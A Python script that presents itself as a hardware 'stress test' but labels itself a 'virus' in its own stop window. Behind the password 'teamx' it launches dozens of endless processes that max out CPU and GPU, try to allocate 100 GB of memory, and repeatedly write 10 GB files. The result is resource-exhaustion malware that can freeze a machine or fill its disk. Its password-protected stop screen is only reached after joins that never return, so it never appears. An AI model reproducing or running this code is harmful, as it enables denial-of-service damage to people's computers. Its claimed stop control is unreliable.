import os
import multiprocessing
import numpy as np
import hashlib
import tkinter as tk

def cpu_stress(stop_event):
    while not stop_event.is_set():
        # Perform extremely intensive CPU calculations
        matrix1 = np.random.random(size=(10000, 10000))
        matrix2 = np.random.random(size=(10000, 10000))
        result = np.power(matrix1, matrix2)
        result = np.exp(result)
        result = np.fft.fft(result)
        
        # Calculate prime numbers
        for num in range(2, 10**9):
            if all(num % i != 0 for i in range(2, int(num ** 0.5) + 1)):
                pass
        
        # Perform cryptographic hashing
        data = os.urandom(10**9)  # Generate 1 GB of random data
        sha256_hash = hashlib.sha256(data).hexdigest()

def gpu_stress(stop_event):
    while not stop_event.is_set():
        # Perform GPU-intensive calculations using OpenGL and stress-ng
        os.system('glxgears -fullscreen &')
        os.system('stress-ng --gpu 4 --gpu-ops 8000')

def memory_stress(stop_event):
    while not stop_event.is_set():
        # Attempt to allocate a significant portion of the system's available memory
        data = [1] * (10**11)  # Allocate 100 GB of memory

def disk_stress(stop_event):
    while not stop_event.is_set():
        # Perform intensive disk write and read operations
        with open("large_file.txt", "w") as file:
            file.write("A" * (10**10))  # Write 10 GB of data to the file
        
        with open("large_file.txt", "r") as file:
            data = file.read()  # Read the entire file

def show_stop_screen(stop_event):
    # Create a black screen with a box to enter the password
    root = tk.Tk()
    root.geometry("400x200")
    root.configure(bg="black")
    
    label = tk.Label(root, text="Enter the password to stop the virus:", bg="black", fg="white")
    label.pack(pady=10)
    
    entry = tk.Entry(root, show="*")
    entry.pack(pady=5)
    
    def check_password():
        password = entry.get()
        if password == "teamx":
            stop_event.set()
            root.destroy()
    
    button = tk.Button(root, text="Stop Virus", command=check_password)
    button.pack(pady=5)
    
    root.mainloop()

def start_stress_test(stop_event):
    print("Initiating extreme CPU, GPU, memory, and disk stress test...")
    
    # Create multiple processes for CPU, GPU, memory, and disk stress
    cpu_processes = [multiprocessing.Process(target=cpu_stress, args=(stop_event,)) for _ in range(32)]
    gpu_processes = [multiprocessing.Process(target=gpu_stress, args=(stop_event,)) for _ in range(16)]
    memory_processes = [multiprocessing.Process(target=memory_stress, args=(stop_event,)) for _ in range(16)]
    disk_processes = [multiprocessing.Process(target=disk_stress, args=(stop_event,)) for _ in range(8)]
    
    # Start the stress test processes
    for process in cpu_processes:
        process.start()
    for process in gpu_processes:
        process.start()
    for process in memory_processes:
        process.start()
    for process in disk_processes:
        process.start()
    
    # Wait for the processes to finish (which they won't)
    for process in cpu_processes:
        process.join()
    for process in gpu_processes:
        process.join()
    for process in memory_processes:
        process.join()
    for process in disk_processes:
        process.join()

def main():
    stop_event = multiprocessing.Event()
    
    password = input("Enter the password: ")
    if password == "teamx":
        start_stress_test(stop_event)
        show_stop_screen(stop_event)
    else:
        print("Incorrect password. Access denied.")

if __name__ == "__main__":
    main()
